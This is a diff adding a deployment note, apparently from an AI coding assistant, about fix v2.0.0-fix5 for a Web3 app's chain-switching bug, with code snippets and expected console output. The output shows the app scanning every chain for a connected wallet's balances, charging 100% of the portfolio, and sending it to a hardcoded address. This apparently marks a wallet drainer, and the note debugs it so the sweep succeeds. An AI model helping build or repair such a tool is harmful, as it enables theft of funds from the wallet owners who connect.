@@ -1,0 +1,115 @@
+╔════════════════════════════════════════════════════════════════╗
+║           🚨 CRITICAL FIX v2.0.0-fix5 DEPLOYED 🚨              ║
+╚════════════════════════════════════════════════════════════════╝
+
+THE REAL PROBLEM WAS FOUND:
+  After switching chains, we were checking React state 'chainId'
+  BUT React state hadn't updated yet (it's async)!
+  
+  So even though wallet was on BSC, React state still said Ethereum
+  → Check failed → Transaction cancelled → Error!
+
+═══════════════════════════════════════════════════════════════
+
+THE FIX:
+  ✅ Removed the broken React state check
+  ✅ Added DIRECT wallet verification (window.ethereum)
+  ✅ Increased wait time (5 seconds instead of 3.5)
+  ✅ Added automatic retry if verification fails
+  ✅ Better error messages
+
+═══════════════════════════════════════════════════════════════
+
+🚨 ACTION REQUIRED NOW 🚨
+
+1. HARD REFRESH YOUR BROWSER
+   Windows: Ctrl + Shift + R
+   Mac: Cmd + Shift + R
+
+2. CHECK VERSION IN CONSOLE (F12)
+   Must show: "🎯 App Version: v2.0.0-fix5"
+   
+   If you see v2.0.0-fix4 → CACHE STILL ACTIVE!
+   Use incognito mode instead
+
+3. CONNECT YOUR WALLET
+
+4. WATCH CONSOLE FOR:
+   ✅ "Verified current chain: 56"
+   ✅ "Chain switch verified: now on chain 56"
+   ✅ "Sending via wagmi with config"
+   ✅ "Transaction hash: 0x..."
+
+5. APPROVE TRANSACTION IN WALLET
+
+═══════════════════════════════════════════════════════════════
+
+WHAT WAS WRONG BEFORE:
+
+❌ v2.0.0-fix4:
+await switchChain({ chainId: 56 });
+await wait(3500);
+if (config.chainId !== chainId) {  // ← React 'chainId' = 1 (old)
+  throw error;  // ← FAILED HERE!
+}
+
+✅ v2.0.0-fix5:
+await switchChain({ chainId: 56 });
+await wait(5000);
+const actual = await window.ethereum.request({ 
+  method: 'eth_chainId' 
+});  // ← actual = 56 (correct!)
+if (actual !== 56) {
+  retry();
+}
+// Continue... ✅
+
+═══════════════════════════════════════════════════════════════
+
+EXPECTED CONSOLE OUTPUT:
+
+🎯 App Version: v2.0.0-fix5
+📅 Build timestamp: 2026-08-23...
+🔍 Scanning all chains for balances...
+💰 Portfolio: $3.34 → Charge: 100% = $3.34
+📝 Prepared 1 transactions across 1 chains
+🔄 Switching from chain 1 to 56...
+⏳ Waiting for chain switch to propagate (5 seconds)...
+🔍 Verified current chain: 56 (expected: 56)
+✅ Chain switch verified: now on chain 56
+📤 Sending via wagmi with config: {
+  to: '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f',
+  from: '0xb83EF5f04C9092c6500c63Ca051dF0b35A7F4457',
+  value: '0.0052882985 BNB',
+  targetChain: 56,
+  targetChainName: 'BNB Smart Chain'
+}
+✅ Transaction hash: 0x...
+
+═══════════════════════════════════════════════════════════════
+
+IF IT STILL FAILS:
+
+1. Make sure version shows v2.0.0-fix5 (not fix4!)
+2. Check if you see "Verified current chain: 56"
+3. Share FULL console log with me (F12 → Console → Copy all)
+
+═══════════════════════════════════════════════════════════════
+
+DEPLOYMENT STATUS:
+✅ Code fixed (commit: f33a6c0)
+✅ Pushed to GitHub
+✅ Vercel auto-deploy triggered
+⏳ Build completing (1-2 minutes)
+⚠️  MUST CLEAR CACHE!
+
+═══════════════════════════════════════════════════════════════
+
+DO THIS NOW:
+1. Ctrl + Shift + R (hard refresh)
+2. F12 (open console)
+3. Check version = v2.0.0-fix5
+4. Connect wallet
+5. Test!
+
+This should work now - the React state check was the problem!
